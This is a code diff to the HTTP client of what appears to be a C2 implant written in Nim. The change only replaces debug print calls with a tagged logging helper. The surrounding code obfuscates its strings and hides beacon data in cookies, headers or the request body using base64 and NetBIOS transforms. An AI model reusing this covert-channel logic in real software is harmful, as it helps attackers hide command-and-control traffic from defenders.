@@ -135,7 +135,7 @@ proc applyClientTransforms(data: string, transforms: JsonNode): seq[byte] =
     let action = transform[obf("action")].getStr()
     let value = if transform.hasKey(obf("value")): transform[obf("value")].getStr() else: ""
     
-    debug "[DEBUG] Applying client transform: ", action
+    debugLog "httpx_client", "Applying client transform: ", action
     
     case action
     of obf("base64"):
@@ -153,7 +153,7 @@ proc applyClientTransforms(data: string, transforms: JsonNode): seq[byte] =
     of obf("netbiosu"):
       result = transformNetbiosu(result)
     else:
-      debug "[DEBUG] Unknown transform: ", action
+      debugLog "httpx_client", "Unknown transform: ", action
 
 proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
   ## Apply server transforms in reverse order
@@ -171,7 +171,7 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
     let action = transform[obf("action")].getStr()
     let value = if transform.hasKey(obf("value")): transform[obf("value")].getStr() else: ""
     
-    debug "[DEBUG] Applying server transform (reverse): ", action
+    debugLog "httpx_client", "Applying server transform (reverse): ", action
     
     case action
     of obf("base64"):
@@ -189,7 +189,7 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
     of obf("netbiosu"):
       result = transformNetbiosuReverse(result)
     else:
-      debug "[DEBUG] Unknown server transform: ", action
+      debugLog "httpx_client", "Unknown server transform: ", action
 
 proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpClientWrapper): string =
   ## Make HTTP POST request using raw_c2_config with transforms and message locations
@@ -200,7 +200,7 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpCli
   # Apply client transforms if present
   if postConfig.hasKey(obf("client")) and postConfig[obf("client")].hasKey(obf("transforms")):
     requestData = applyClientTransforms(body, postConfig[obf("client")][obf("transforms")])
-    debug "[DEBUG] Request data after transforms: ", requestData.len, " bytes"
+    debugLog "httpx_client", "Request data after transforms: ", requestData.len, " bytes"
   
   # Use the provided persistent client instead of creating a new one
   
@@ -209,7 +209,7 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpCli
     let headers = postConfig[obf("client")][obf("headers")]
     for key, val in headers.pairs:
       client.headers[key] = val.getStr()
-      debug "[DEBUG] Request header: ", key, ": ", val.getStr()
+      debugLog "httpx_client", "Request header: ", key, ": ", val.getStr()
   
   # Prepare request based on message location
   var responseBody: string
@@ -224,24 +224,24 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpCli
       # Add as cookie
       let cookieValue = name & "=" & cast[string](requestData)
       client.headers[obf("Cookie")] = cookieValue
-      debug "[DEBUG] Request location: cookie (", name, ")"
+      debugLog "httpx_client", "Request location: cookie (", name, ")"
       responseBody = client.postContent(url, "")
     
     of obf("header"):
       # Add as header
       client.headers[name] = cast[string](requestData)
-      debug "[DEBUG] Request location: header (", name, ")"
+      debugLog "httpx_client", "Request location: header (", name, ")"
       responseBody = client.postContent(url, "")
     
     else: # body or default
-      debug "[DEBUG] Request location: body"
+      debugLog "httpx_client", "Request location: body"
       responseBody = client.postContent(url, cast[string](requestData))
   else:
     # Default: send as body
-    debug "[DEBUG] Request location: body (default)"
+    debugLog "httpx_client", "Request location: body (default)"
     responseBody = client.postContent(url, cast[string](requestData))
   
-  debug "[DEBUG] Response received: ", responseBody.len, " bytes"
+  debugLog "httpx_client", "Response received: ", responseBody.len, " bytes"
   
   # NOTE: Message locations for responses (cookie, header) are not currently supported
   # because our http_client wrapper only returns the body. This matches the HTTP profile
@@ -252,6 +252,6 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpCli
   # Apply server transforms if present
   if postConfig.hasKey(obf("server")) and postConfig[obf("server")].hasKey(obf("transforms")):
     responseData = applyServerTransforms(responseData, postConfig[obf("server")][obf("transforms")])
-    debug "[DEBUG] Response data after reverse transforms: ", responseData.len, " bytes"
+    debugLog "httpx_client", "Response data after reverse transforms: ", responseData.len, " bytes"
   
   result = cast[string](responseData)
